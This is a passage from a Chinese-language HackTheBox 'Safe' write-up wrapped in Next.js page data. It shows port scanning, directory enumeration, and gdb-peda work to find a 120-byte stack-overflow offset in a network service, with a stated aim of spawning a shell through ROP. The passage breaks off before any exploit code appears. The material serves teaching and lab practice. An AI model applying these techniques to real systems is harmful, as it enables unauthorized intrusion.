f9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name\":\"\",\"async\":false}\n9:I{\"id\":\"1234\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name\":\"Analytics\",\"async\":false}\na:I{\"id\":\"9544\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\""])</script><script>self.__next_f.push([1,",\"async\":false}\nb:I{\"id\":\"99\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"3:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/7049305331e382c9.css\",\"precedence\":\"next\"}]],[\"$\",\"$L4\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/htb-safe-writeup\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"htb-safe-writeup\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"htb-safe-writeup\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[\"$L5\",[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]],\"globalErrorComponent\":\"$6\",\"notFound\":[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L7\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L8\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L8\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]}]}],[\"$\",\"main\",null,{\"children\":[\"$undefined\",[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]]}]]}],[\"$\",\"$L9\",null,{}]]}]}]}],\"asNotFound\":false,\"children\":[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L7\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L8\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L8\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]}]}],[\"$\",\"main\",null,{\"children\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"slug\",\"htb-safe-writeup\",\"c\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Lc\",null],\"segment\":\"__PAGE__?{\\\"slug\\\":[\\\"htb-safe-writeup\\\"]}\"},\"styles\":[]}],\"segment\":[\"slug\",\"htb-safe-writeup\",\"c\"]},\"styles\":[]}],\"segment\":\"posts\"},\"styles\":[]}]}]]}],[\"$\",\"$L9\",null,{}]]}]}]}],null]}]]\n"])</script><script>self.__next_f.push([1,"d:I{\"id\":\"1753\",\"chunks\":[\"110:static/chunks/110-fa1ef238a86eb8d6.js\",\"49:static/chunks/app/posts/[...slug]/page-b5cd823d07a42590.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"$Ld\",null,{}],[\"$\",\"article\",null,{\"className\":\"py-6 prose post-prose dark:prose-invert\",\"children\":[[\"$\",\"div\",null,{\"className\":\"post-title\",\"children\":\"HTB safe Writeup\"}],[\"$\",\"time\",null,{\"dateTime\":\"2019-12-14T19:07:29.000Z\",\"className\":\"post-time\",\"children\":\"December 14, 2019\"}],\"$undefined\",[\"$\",\"div\",null,{\"className\":\"js-toc-content\",\"children\":[[\"$\",\"h1\",null,{\"id\":\"前言\",\"children\":\"前言\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"这是一篇writeup，靶机是来自hackthebox的\",[\"$\",\"a\",null,{\"href\":\"https://www.hackthebox.eu/home/machines/profile/199\",\"children\":\"safe\"}]]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"信息收集\",\"children\":\"信息收集\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"一开始扫全端口，不知道是不是网络问题，怎么都扫不完，后来限制了一下速率：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"kali at ~/htb/safe ❯ nmap -p- --min-rate 10000 -sV -sC -sS 10.10.10.147\\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 22:27 EST\\nNmap scan report \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" 10.10.10.147\\nHost is up (7.6s latency).\\nNot shown: 61065 filtered ports, 4468 closed ports\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\\n| ssh-hostkey:\\n|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)\\n|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)\\n|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\\n|_http-server-header: Apache/2.4.25 (Debian)\\n|_http-title: Apache2 Debian Default Page: It works\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"只有22端口和80端口，看来只能从Web入手了，大便系统上搭的apache\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"为什么没扫出来1337端口\",\"children\":\"为什么没扫出来1337端口\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"在后续的发现中是还有一个1337端口是开放的，后面看别人的Writeup也有部分Writeup是可以扫出来1337端口的，为啥我这里没有扫出来呢？原因在于应使用\",[\"$\",\"code\",null,{\"children\":\"-PN\"}],\"参数：\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"kali at ~/htb/safe ❯ nmap -Pn -p1337 10.10.10.147\\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST\\nNmap scan report \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" 10.10.10.147\\nHost is up (0.45s latency).\\n\\nPORT     STATE SERVICE\\n1337/tcp open  waste\\n\\nNmap \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"done\"}],\": 1 IP address (1 host up) scanned \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" 0.67 seconds\\nkali at ~/htb/safe ❯ nmap -p1337 10.10.10.147\\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST\\nNmap scan report \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" 10.10.10.147\\nHost is up (0.00029s latency).\\n\\nPORT     STATE    SERVICE\\n1337/tcp filtered waste\\n\\nNmap \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"done\"}],\": 1 IP address (1 host up) scanned \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" 0.69 seconds\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"默认下nmap是会先探测主机是否存活，使用\",[\"$\",\"code\",null,{\"children\":\"-Pn\"}],\"会跳过主机探测的步骤（也就是不Ping）。但是这里有点疑惑的这个IP本身就是可以Ping的，所以理论上跳不跳过主机探测不都是一样的吗？为什么用不用\",[\"$\",\"code\",null,{\"children\":\"-Pn\"}],\"参数的效果不一样呢？\"]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"web\",\"children\":\"Web\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"打开只有一个大便Apache的默认页面：\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"img\",null,{\"src\":\"/6.jpg\",\"alt\":\"\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"看到这个页面就觉得应该是要扫一下目录：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"⇒  python dirsearch.py -u http://10.10.10.147 -e *\\n\\n _|. _ _  _  _  _ _|_    v0.3.8\\n(_||| _) (/_(_|| (_| )\\n\\nExtensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6103\\n\\nError Log: /Users/danta/Code/dirsearch/logs/errors-19-12-14_19-09-19.\",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\"\\n\\nTarget: http://10.10.10.147\\n\\n[19:09:20] Starting:\\n[19:09:33] 403 -  291B  - /.hta\\n[19:09:33] 403 -  300B  - /.htaccess.BAK\\n[19:09:33] 403 -  301B  - /.htaccess.bak1\\n[19:09:33] 403 -  302B  - /.htaccess-marco\\n[19:09:33] 403 -  300B  - /.htaccess-dev\\n[19:09:33] 403 -  302B  - /.htaccess-local\\n[19:09:33] 403 -  298B  - /.ht_wsr.txt\\n[19:09:33] 403 -  300B  - /.htaccess.old\\n[19:09:33] 403 -  301B  - /.htaccess.orig\\n[19:09:33] 403 -  301B  - /.htaccess.save\\n[19:09:33] 403 -  303B  - /.htaccess.sample\\n[19:09:33] 403 -  300B  - /.htaccess.txt\\n[19:09:33] 403 -  299B  - /.htaccess_sc\\n[19:09:33] 403 -  299B  - /.htaccessBAK\\n[19:09:33] 403 -  302B  - /.htaccess_extra\\n[19:09:33] 403 -  301B  - /.htaccess_orig\\n[19:09:34] 403 -  300B  - /.htaccessOLD2\\n[19:09:34] 403 -  295B  - /.htgroup\\n[19:09:34] 403 -  297B  - /.htaccess~\\n[19:09:34] 403 -  299B  - /.htaccessOLD\\n[19:09:34] 403 -  300B  - /.htpasswd-old\\n[19:09:34] 403 -  301B  - /.htpasswd_test\\n[19:09:35] 403 -  297B  - /.htpasswds\\n[19:09:35] 403 -  295B  - /.htusers\\n[19:12:31] 200 -   11KB - /index.html\\n[19:12:56] 301 -  313B  - /manual  -\u003e  http://10.10.10.147/manual/\\n[19:12:56] 200 -  626B  - /manual/index.html\\n[19:13:53] 403 -  300B  - /server-status\\n[19:13:53] 403 -  301B  - /server-status/\\n\\nTask Completed\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"打开\",[\"$\",\"code\",null,{\"children\":\"/manual\"}],\"看看，发现是apache的文档页面，又是默认页面。后来又换了一些字典，发现还是相同的结果。想来想去也没有别的入口的，后来看看别人的writeup才发现原来还可以这样。。。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"查看首页的源码：\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"img\",null,{\"src\":\"/8.jpg\",\"alt\":\"\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"里面说还有个1337端口，而且这个程序还可以通过访问路径\",[\"$\",\"code\",null,{\"children\":\"myapp\"}],\"下载。我是真没想到还可以修改默认页面，看来真是每个细节都不能放过。。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"下载myapp后查看是个可执行文件，执行一下看看，然后再看看1337端口\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"kali at ~/htb/safe ❯ file myapp\\nmyapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped\\nkali at ~/htb/safe ❯ \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"chmod\"}],\" u+x myapp\\nkali at ~/htb/safe ❯ ./myapp\\n 00:23:04 up 1 day, 23:52,  3 \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"users\"}],\",  load average: 0.00, 0.00, 0.00\\n\\nWhat \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"do\"}],\" you want me to \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"echo\"}],\" back? \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\nkali at ~/htb/safe ❯ nc 10.10.10.147 1337\\n 00:26:35 up 18:21,  0 \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"users\"}],\",  load average: 0.00, 0.00, 0.00\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n\\nWhat \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"do\"}],\" you want me to \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"echo\"}],\" back? \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"到这一步后我有点意外...这不就是一道pwn题吗....\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"通过栈溢出getshell\",\"children\":\"通过栈溢出GetShell\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"到现在我们知道1337端口的程序就是\",[\"$\",\"code\",null,{\"children\":\"myapp\"}],\"，就目前所知的是这个程序会输出我们输入的东西。看起来就是一个栈溢出的题目。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"使用checksec查看表示开启了NX，但是没有其他的保护了。栈溢出的利用方式大概有4种（\",[\"$\",\"a\",null,{\"href\":\"https://paper.seebug.org/271/\",\"children\":\"手把手教你栈溢出从入门到放弃（上）\"}],\"，\",[\"$\",\"a\",null,{\"href\":\"https://paper.seebug.org/272/\",\"children\":\"手把手教你栈溢出从入门到放弃（下）\"}],\"）。NX开启了意味着栈上不能执行shellcode，这儿又不知道所用的动态库的版本，没办法用return2libc方法。所以只能用rop的方式。\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali:htb/safe \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# gdb -q myapp\"}],\"\\nReading symbols from myapp...\\n(No debugging symbols found \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" myapp)\\ngdb-peda$ checksec\\nCANARY    : disabled\\nFORTIFY   : disabled\\nNX        : ENABLED\\nPIE       : disabled\\nRELRO     : Partial\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"要利用ROP来getshell，我们需要确定两件事：一个是溢出数据的长度，另一个是\",[\"$\",\"code\",null,{\"children\":\"gadget\"}],\"（某段指令）的地址。\"]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"确定溢出长度\",\"children\":\"确定溢出长度\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"给\",[\"$\",\"code\",null,{\"children\":\"gdb\"}],\"装上 \",[\"$\",\"a\",null,{\"href\":\"https://github.com/longld/peda\",\"children\":\"Peda\"}],\" 插件，可以很简单即可确定溢出长度。这里需要注意的是，gdb在调试多进程的时候，默认会只调试主进程，而peda是会继续跟踪子进程（\",[\"$\",\"a\",null,{\"href\":\"https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/index.html\",\"children\":\"相关\"}],\"）。在这个程序中，因为多进程的原因导致程序直接退出了，所以先设置了一下\",[\"$\",\"code\",null,{\"children\":\"set follow-fork-mode parent\"}],\"来保证peda只调试主进程。\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali:htb/safe \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# gdb -q myapp\"}],\"\\nReading symbols from myapp...\\n(No debugging symbols found \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" myapp)\\ngdb-peda$ \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"set\"}],\" follow-fork-mode parent\\ngdb-peda$ pattern_create 200\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\"}],\"\\ngdb-peda$ r\\nStarting program: /root/htb/safe/myapp\\n[Detaching after vfork from child process 79586]\\n 03:15:51 up 2 days,  2:44,  3 \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"users\"}],\",  load average: 0.00, 0.00, 0.00\\n\\nWhat \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"do\"}],\" you want me to \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"echo\"}],\" back? AAA%AAsAABAA\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$AAnAACAA\"}],\"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nAAA%AAsAABAA\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$AAnAACAA\"}],\"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\n\\nProgram received signal SIGSEGV, Segmentation fault.\\n[----------------------------------registers-----------------------------------]\\nRAX: 0x0\\nRBX: 0x0\\nRCX: 0x7ffff7ee0904 (\u003c__GI___libc_write+20\u003e:\\tcmp    rax,0xfffffffffffff000)\\nRDX: 0x7ffff7fb1580 --\u003e 0x0\\nRSI: 0x405260 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":[\"\\\"AAA%AAsAABAA\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$AAnAACAA\"}],\"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"]}],\"...)\\nRDI: 0x0\\nRBP: 0x41414e4141384141 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'AA8AANAA'\"}],\")\\nRSP: 0x7fffffffe348 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\nRIP: 0x4011ac (\u003cmain+77\u003e:\\tret)\\nR8 : 0xc9\\nR9 : 0x0\\nR10: 0x4003e0 --\u003e 0x6972700073747570 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'puts'\"}],\")\\nR11: 0x246\\nR12: 0x401070 (\u003c_start\u003e:\\txor    ebp,ebp)\\nR13: 0x7fffffffe420 --\u003e 0x1\\nR14: 0x0\\nR15: 0x0\\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"trap\"}],\" INTERRUPT direction overflow)\\n[-------------------------------------code-------------------------------------]\\n   0x4011a1 \u003cmain+66\u003e:\\tcall   0x401030 \u003cputs@plt\u003e\\n   0x4011a6 \u003cmain+71\u003e:\\tmov    eax,0x0\\n   0x4011ab \u003cmain+76\u003e:\\tleave\\n=\u003e 0x4011ac \u003cmain+77\u003e:\\tret\\n   0x4011ad:\\tnop    DWORD PTR [rax]\\n   0x4011b0 \u003c__libc_csu_init\u003e:\\tpush   r15\\n   0x4011b2 \u003c__libc_csu_init+2\u003e:\\tmov    r15,rdx\\n   0x4011b5 \u003c__libc_csu_init+5\u003e:\\tpush   r14\\n[------------------------------------stack-------------------------------------]\\n0000| 0x7fffffffe348 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0008| 0x7fffffffe350 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0016| 0x7fffffffe358 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0024| 0x7fffffffe360 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0032| 0x7fffffffe368 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0040| 0x7fffffffe370 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0048| 0x7fffffffe378 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n0056| 0x7fffffffe380 (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"AuAAXAAvAAYAAwAAZAAxAAyA\\\"\"}],\")\\n[------------------------------------------------------------------------------]\\nLegend: code, data, rodata, value\\nStopped reason: SIGSEGV\\n0x00000000004011ac \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" main ()\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"可以看到输入了200个长度的字符串后引起了程序的报错（因为程序的返回地址被刚输入的字符串覆盖了，一个错误的地址导致了异常退出，这个错误的地址就是栈顶的值。），这时候我们取到栈顶的值来计算溢出长度。\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":\"gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\njAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120\\ngdb-peda$ pattern_create\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"得到溢出长度120。\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"选择gadgets\",\"children\":\"选择Gadgets\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"最终的目的是要获取shell，所以需要执行类似\",[\"$\",\"code\",null,{\"children\":\"system(\\\"/bin/sh\\\")\"}],\"的方法来获得一个shell，因为可以通过栈溢出控制程序执行流程，那么我就还需要两个东西：一个是system函数的地址，一个是\\\"/bin/sh\\\"字符串的地址。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"先看一下程序本身有什么函数可以用：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"gdb-peda$ info \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"functions\"}],\"\\nAll defined \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"functions\"}],\":\\n\\nNon-debugging symbols:\\n0x0000000000401000  _init\\n0x0000000000401030  puts@plt\\n0x0000000000401040  system@plt\\n0x0000000000401050  \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"printf\"}],\"@plt\\n0x0000000000401060  gets@plt\\n0x0000000000401070  _start\\n0x00000000004010a0  _dl_relocate_static_pie\\n0x00000000004010b0  deregister_tm_clones\\n0x00000000004010e0  register_tm_clones\\n0x0000000000401120  __do_global_dtors_aux\\n0x0000000000401150  frame_dummy\\n0x0000000000401152  \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"test\"}],\"\\n0x000000000040115f  main\\n0x00000000004011b0  __libc_csu_init\\n0x0000000000401210  __libc_csu_fini\\n0x0000000000401214  